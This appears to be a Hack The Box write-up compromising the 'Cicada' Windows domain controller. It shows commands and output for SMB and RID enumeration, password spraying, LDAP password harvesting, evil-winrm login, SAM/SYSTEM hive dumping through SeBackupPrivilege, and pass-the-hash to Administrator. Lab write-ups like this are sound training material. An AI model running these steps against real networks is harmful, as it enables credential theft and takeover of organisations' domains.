@@ -1,0 +1,528 @@
+
+
+Hack the box HTB Easy Windows
+
+Cicada Walkthrough (HTB)
+
+
+As-Salaam-Alaikum frens, In the name of Allah, the Most Merciful and Most Beneficent, I’d like to share an easy walkthrough for a recent Windows challenge I tackled on Hack The Box (HTB).
+
+Enumeration
+
+The first step for any machine is enumeration. We’ll kick things off with a straightforward Nmap scan to identify open ports on the target. From there, we can focus on the low-hanging fruit and start our enumeration process.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ nmap -Pn -sC -sV --min-rate 2000 -oA nmap 10.10.11.35                                                                                                                                                           
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 09:15 WAT                                                                                                                                                  
+Nmap scan report for cicada.htb (10.10.11.35)                                                                                                                                                                       
+Host is up (0.23s latency).                                                                                                                                                                                         
+Not shown: 989 filtered tcp ports (no-response)                                                                                                                                                                     
+PORT     STATE SERVICE       VERSION                                                                                                                                                                                
+53/tcp   open  domain        Simple DNS Plus                                                                                                                                                                        
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-25 15:15:19Z)                                                                                                                         
+135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                                                                  
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                          
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)                                                                                          
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                                                                                                                                                
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb                                                                                                                
+| Not valid before: 2024-08-22T20:24:16                                                                                                                                                                             
+|_Not valid after:  2025-08-22T20:24:16                                                                                                                                                                             
+|_ssl-date: TLS randomness does not represent time                                                                                                                                                                  
+445/tcp  open  microsoft-ds?                                                                                                                                                                                        
+464/tcp  open  kpasswd5?                                                                                                                                                                                            
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                                                                    
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)                                                                                          
+|_ssl-date: TLS randomness does not represent time                                                                                                                                                                  
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                                                                                                                                                
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+We found some interesting ports, including Kerberos, SMB, and LDAP. However, the most intriguing ones to start with are ports 139 and 445. First, let’s add the domain name to our hosts file using the simple command below:
+
+echo "10.10.11.35 cicada.htb CICADA-DC.cicada.htb | sudo tee -a /etc/hosts
+With the open SMB port, we can try to enumerate it to check for anonymous login access or using random user accounts. We can use netexec for this purpose.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ netexec smb cicada.htb -u babul -p ""                
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\babul:
+Since it accepts random usernames without a password, similar to an anonymous login, we can use the same netexec command to enumerate the shares available on the system.
+
+──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ netexec smb cicada.htb -u babul -p "" --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\babul: 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV                             
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
+Great! We now have read access to the HR and IPC$ shares. Let’s use smbclient to access them.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ smbclient //cicada.htb/HR -N                          
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 13:29:09 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 18:31:48 2024
+
+		4168447 blocks of size 4096. 439121 blocks available
+smb: \> mget *
+Get file Notice from HR.txt? y
+getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
+smb: \>
+After accessing the HR share with smbclient, we found a notice file. Using the mget command, we downloaded it to our local machine. Let’s check out what it contains!
+
+
+
+Upon reading the content of the file, we noticed it discusses changing a password and mentions a default password. However, we don’t know which user this password applies to. This is where netexec comes into play again; we can use it with the --rid-brute option to retrieve the users on the system. If we prefer not to use netexec, there’s another method using impacket-lookupsid, which I’ll demonstrate next.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ netexec smb cicada.htb -u babul -p "" --rid-brute    
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\abzee: 
+SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+OR
+
+──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ impacket-lookupsid anonymous@cicada.htb          
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Brute forcing SIDs at cicada.htb
+[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
+498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: CICADA\Administrator (SidTypeUser)
+501: CICADA\Guest (SidTypeUser)
+502: CICADA\krbtgt (SidTypeUser)
+512: CICADA\Domain Admins (SidTypeGroup)
+513: CICADA\Domain Users (SidTypeGroup)
+514: CICADA\Domain Guests (SidTypeGroup)
+515: CICADA\Domain Computers (SidTypeGroup)
+516: CICADA\Domain Controllers (SidTypeGroup)
+517: CICADA\Cert Publishers (SidTypeAlias)
+518: CICADA\Schema Admins (SidTypeGroup)
+519: CICADA\Enterprise Admins (SidTypeGroup)
+520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+525: CICADA\Protected Users (SidTypeGroup)
+526: CICADA\Key Admins (SidTypeGroup)
+527: CICADA\Enterprise Key Admins (SidTypeGroup)
+553: CICADA\RAS and IAS Servers (SidTypeAlias)
+571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+1000: CICADA\CICADA-DC$ (SidTypeUser)
+1101: CICADA\DnsAdmins (SidTypeAlias)
+1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+1103: CICADA\Groups (SidTypeGroup)
+1104: CICADA\john.smoulder (SidTypeUser)
+1105: CICADA\sarah.dantelia (SidTypeUser)
+1106: CICADA\michael.wrightson (SidTypeUser)
+1108: CICADA\david.orelious (SidTypeUser)
+1109: CICADA\Dev Support (SidTypeGroup)
+1601: CICADA\emily.oscars (SidTypeUser)
+When we run impacket-lookupsid, it might prompt us for a password, but we can just hit enter to skip that. This will display the users on the system. We’re particularly interested in the entries labeled as SidTypeUser, as those are the ones we can work with. Let’s jot down the users we find and try a password spray using the password we discovered earlier.
+
+
+
+It looks like the user michael.wrightson is associated with the password we found. Let’s go ahead and use that password to check which shares we have read or write access to.
+
+netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6C*******' --shares     
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Co***** 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV                             
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
+From the output of our shares, we found some with read access, but unfortunately, there wasn’t much of value in them. However, we noticed the DEV share, which we don’t have access to. So, what’s next? If we remember our earlier Nmap scan, we saw that LDAP is open. Let’s try using user michael.wrightson and it's password we have to see if we can authenticate with LDAP.
+
+
+
+Boom! We can authenticate with LDAP. One of the great things about LDAP is that it allows us to retrieve both users and passwords. Since we already have the user list, we’re specifically looking for passwords this time. Still, I’ll demonstrate how to extract users using LDAP, just for clarity.
+
+──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Co*******' -b 'dc=cicada,dc=htb'
+# extended LDIF
+#
+# LDAPv3
+# base <dc=cicada,dc=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# cicada.htb
+dn: DC=cicada,DC=htb
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=cicada,DC=htb
+instanceType: 5
+whenCreated: 20240314110913.0Z
+whenChanged: 20241025170149.0Z
+subRefs: DC=DomainDnsZones,DC=cicada,DC=htb
+subRefs: DC=ForestDnsZones,DC=cicada,DC=htb
+subRefs: CN=Configuration,DC=cicada,DC=htb
+uSNCreated: 4099
+dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAtjbkfJKCAEWhotWA90BBVw==
+uSNChanged: 196664
+name: cicada
+objectGUID:: t/9uUtkEcU6GUir6/F/Y4A==
+replUpToDateVector:: AgAAAAAAAAAPAAAAAAAAAN5vZApGs2FKkbS2vn0tk60d8AEAAAAAAKtQ4
+ RwDAAAAsGlMKikniEul6SOacTX3liRgAgAAAAAAcoriHAMAAAAVEr0qoVwfSLOjDOjAth0NHOABAA
+ AAAACh6N8cAwAAAK+qLDkO3fdHs0uyaQVVn44fEAIAAAAAAAV64RwDAAAAoRpkRIF5+k6gSstx/68
+ wzh4AAgAAAAAAQF3hHAMAAADfPuBSRuVkT7grPo1jAYz4I1ACAAAAAACLj+EcAwAAACgtU1ayzflF
+ tZ3q0oF+cIcr0AIAAAAAAAzG4hwDAAAAtjbkfJKCAEWhotWA90BBVwrAAAAAAAAAc97XHAMAAADzT
+ P2JCyr4R5Ai973ExkVtJoACAAAAAAAasOIcAwAAANACjpAlX+BPlnJ3kA3WzA4uAAMAAAAAAPpfLB
+ 0DAAAAaE50s3GvQU2f3LXEBUNbOheQAQAAAAAAkmXdHAMAAABOhOrW0R+zS6sNX5zDhlReGbABAAA
+ AAACrcN0cAwAAAG/Jlt6JXiNHim7BjVkd0x4qwAIAAAAAAL2/4hwDAAAA4aRP7N9o9EavuLlkyz+M
+ 2BVwAQAAAAAAh4vZHAMAAAAwB2//SgRuSoX2Di5jYB6RLOACAAAAAACZIgIdAwAAAA==
+creationTime: 133743493097102242
+forceLogoff: -9223372036854775808
+lockoutDuration: -18000000000
+For extracting users only simply use below command:
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Co*****' -b 'dc=cicada,dc=htb' "(objectClass=person)" | grep "sAMAccountName:"
+sAMAccountName: Administrator
+sAMAccountName: Guest
+sAMAccountName: CICADA-DC$
+sAMAccountName: krbtgt
+sAMAccountName: john.smoulder
+sAMAccountName: sarah.dantelia
+sAMAccountName: michael.wrightson
+sAMAccountName: david.orelious
+sAMAccountName: emily.oscars
+Using this command, we can see that it only displays the usernames. To look for passwords, we can use grep pass at the end, as shown below.
+
+ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Co****' -b 'dc=cicada,dc=htb' | grep pass
+Looks like we’ve found another password! Let’s go ahead and perform a password spray to identify its owner.
+
+
+
+Now that we have the password owner as david.orelious, let’s check if we have access to the DEV shares now.
+
+──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ netexec smb cicada.htb -u david.orelious -p 'aRt$Lp****' --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp**** 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
+Finally, we’ve gained read access to the DEV shares. Let’s dive in and see what we can discover.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ smbclient //cicada.htb/DEV -U david.orelious 
+Password for [WORKGROUP\david.orelious]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 13:31:39 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 18:28:22 2024
+
+		4168447 blocks of size 4096. 434534 blocks available
+smb: \> get Backup_script.ps1
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+smb: \>
+We’re in, and we’ve spotted a backup PowerShell file. We used the get command to download it to our local Kali machine. Now, let’s check its contents to see what it does.
+
+
+
+Awesome! With the new username and password, it looks like we might be in for a windfall of credentials. Let’s check if the WinRM port is open on the target.
+
+Foothold
+
+To check if the WinRM port is open, a simple Nmap scan will do the trick, just specify the port.
+
+──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ nmap -Pn -p5985 10.10.11.35 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:35 WAT
+Nmap scan report for cicada.htb (10.10.11.35)
+Host is up (0.20s latency).
+
+PORT     STATE SERVICE
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
+Now that we have the new credentials, let’s see if we can log in with them. We can use netexec to confirm our access.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ netexec winrm cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b******'       
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6***** (Pwn3d!)
+Since we received a pwned response from netexec, we can use that to gain access to the target.
+
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*****'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
+Now that we’re in, all that’s left is to locate and view the contents of the user.txt file in the user’s desktop directory.
+
+*Evil-WinRM* PS C:\users\emily.oscars.CICADA> cd C:\users
+*Evil-WinRM* PS C:\users> dir
+
+
+    Directory: C:\users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/26/2024   1:10 PM                Administrator
+d-----         8/22/2024   2:22 PM                emily.oscars.CICADA
+d-r---         3/14/2024   3:45 AM                Public
+
+
+*Evil-WinRM* PS C:\users> cd emily.oscars.CICADA
+*Evil-WinRM* PS C:\users\emily.oscars.CICADA> cd desktop
+*Evil-WinRM* PS C:\users\emily.oscars.CICADA\desktop> dir
+
+
+    Directory: C:\users\emily.oscars.CICADA\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        10/25/2024  10:02 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\users\emily.oscars.CICADA\desktop> more user.txt; whoami; hostname; ipconfig
+08ec8d5983bd61a131*
+
+cicada\emily.oscars
+CICADA-DC
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::902:d0be:bad7:ecdd
+   Link-local IPv6 Address . . . . . : fe80::c682:4f03:bce0:bbf0%6
+   IPv4 Address. . . . . . . . . . . : 10.10.11.35
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:679a%6
+                                       10.10.10.2
+*Evil-WinRM* PS C:\users\emily.oscars.CICADA\desktop>
+Privilege Escalation
+
+To access the administrator directory, we need to elevate our privileges from the current user to admin rights. The first step is to run whoami /priv to check our current privileges.
+
+
+
+The SeBackupPrivilege allows user to read all files on the system, and we’ll definitely use this to our advantage. First, we'll navigate to the C:\ directory and create a Temp directory. If we want to be more discreet, we can also go to a directory where we have read and write privileges.
+
+Once in the Temp directory, we’ll use our SeBackupPrivilege to read the SAM file and save a copy of it. We’ll do the same for the SYSTEM file, ensuring we have variants of both.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> cd C:\
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/22/2024  11:45 AM                PerfLogs
+d-r---         8/29/2024  12:32 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----         3/14/2024   5:21 AM                Shares
+d-r---         8/26/2024   1:11 PM                Users
+d-----         9/23/2024   9:35 AM                Windows
+
+
+*Evil-WinRM* PS C:\> mkdir Temp
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/25/2024   9:40 AM                Temp
+
+
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/22/2024  11:45 AM                PerfLogs
+d-r---         8/29/2024  12:32 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----         3/14/2024   5:21 AM                Shares
+d-----        10/25/2024   9:40 AM                Temp
+d-r---         8/26/2024   1:11 PM                Users
+d-----         9/23/2024   9:35 AM                Windows
+
+
+*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\>
+Now, let's change into the Temp directory we created. We should be able to see the SAM and SYSTEM files that we just saved there and download them to our localhost.
+
+*Evil-WinRM* PS C:\> cd Temp
+*Evil-WinRM* PS C:\Temp> dir
+
+
+    Directory: C:\Temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        10/25/2024   9:41 AM          49152 sam
+-a----        10/25/2024   9:41 AM       18518016 system
+
+
+*Evil-WinRM* PS C:\Temp> download sam
+                                        
+Info: Downloading C:\Temp\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Temp> download system
+                                        
+Info: Downloading C:\Temp\system to system
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Temp>
+Now, we can extract the hive secrets from the SAM and SYSTEM files using pypykatz, a Python variant of Mimikatz. We’ll run its registry function and use the --sam parameter to provide the paths to the SAM and SYSTEM files. Once we execute the command we should be able to retrieve the NTLM hashes of the administrator.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ pypykatz registry --sam sam system
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 3c2b033757a49110a9ee680b46e8d620
+============== SAM hive secrets ==============
+HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c1010101010101010101010101
+Administrator:500:aad3b435b51404eeaad3b435b5:2b87e7c93a3e8a0*********:::
+Guest:501:aad3b435b51404eeaad3b435b5:31d6cfe0d16ae931b73c5***********:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b5:31d6cfe0d16ae931b7*****:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b:31d6cfe0d16ae931b73c59*****:::
+With the Administrator hash in hand, we can access the Administrator account using Evil-WinRM.
+
+┌──(root@BabulSecX)-[~/Documents/HTB/Cicada]
+└─$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a********
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cicada\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\users\administrator\desktop
+*Evil-WinRM* PS C:\users\administrator\desktop> dir
+
+
+    Directory: C:\users\administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        10/25/2024   9:39 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\users\administrator\desktop> more root.txt; whoami; hostname; ipconfig
+5b0c7aa6cd96c1058bed********
+
+cicada\administrator
+CICADA-DC
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::d063:8ff9:303d:ce6d
+   Link-local IPv6 Address . . . . . : fe80::12d6:2115:6e12:34d8%6
+   IPv4 Address. . . . . . . . . . . : 10.10.11.35
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:679a%6
+                                       10.10.10.2
+*Evil-WinRM* PS C:\users\administrator\desktop>
+
+https://www.hackthebox.com/achievement/machine/1993779/627
+
